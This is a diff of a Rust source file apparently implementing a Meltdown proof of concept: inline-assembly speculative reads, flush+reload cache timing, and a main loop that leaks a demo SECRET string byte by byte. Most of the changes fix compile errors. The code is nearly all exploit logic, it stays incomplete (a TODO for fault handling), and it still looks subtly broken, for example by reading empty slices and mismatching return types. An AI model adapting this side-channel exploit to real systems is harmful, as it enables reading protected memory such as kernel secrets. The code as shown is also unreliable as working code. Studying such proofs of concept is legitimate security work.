@@ -20,7 +20,7 @@ pub struct Config {
 	retries: u32,
 }
 
-pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u128) {
+pub fn meltdown_fast<T: ?Sized>(mem: &[MemoryPage], pointer: *const T) {
     unsafe {
         asm!(
             "mov {tmp} [{x}]",
@@ -79,7 +79,7 @@ pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bo
     end_time - start_time < cache_miss_threshold
 }
 
-pub fn libkdump_read_signal_handler(config: Config cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> usize {
+pub fn libkdump_read_signal_handler<T: ?Sized>(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const T) -> usize {
 	for _ in 0..config.retries {
 		// TODO: Set segmentation fault callback position
 		meltdown_fast(mem, pointer);
@@ -98,7 +98,7 @@ pub fn libkdump_read_signal_handler(config: Config cache_miss_threshold: u64, me
 	return 0;
 }
 
-pub fn libkdump_read(config: Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u128) -> u32 {
+pub fn libkdump_read<T: ?Sized>(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const T) -> u32 {
 	const ARRAY_SIZE: usize = 256;
 	let mut res_stat: [u32; ARRAY_SIZE] = [0; ARRAY_SIZE];
 	
@@ -111,7 +111,7 @@ pub fn libkdump_read(config: Config, cache_miss_threshold: u64, mem: &[MemoryPag
 	}
 	
 	let max_i = *res_stat.iter().max().expect("Couldn't find maximum!");
-	if max_i > accept_after {
+	if max_i > config.accept_after {
 		max_i
 	} else {
 		0
@@ -160,9 +160,9 @@ pub fn main() {
     const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     const SECRET: &str = "Whoever reads this is dumb.";
     let default_config = Config {
-		measurements = 3,
-		accept_after = 1,
-		retries = 10000,
+		measurements: 3,
+		accept_after: 1,
+		retries: 10000,
 	};
     
     println!("Current CPU time: {}", rdtsc());
@@ -174,8 +174,10 @@ pub fn main() {
         flush(&mem[i] as *const MemoryPage);
     }
     
-    let mut index = 0;
+    let mut index: usize = 0;
     while index < SECRET.len() {
-		let value = libkdump_read(default_config, SECRET[index] as *const u128);
+		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, &SECRET[index..index] as *const str);
+		println!("Got value: {}", value);
+		index += 1;
 	}
 }
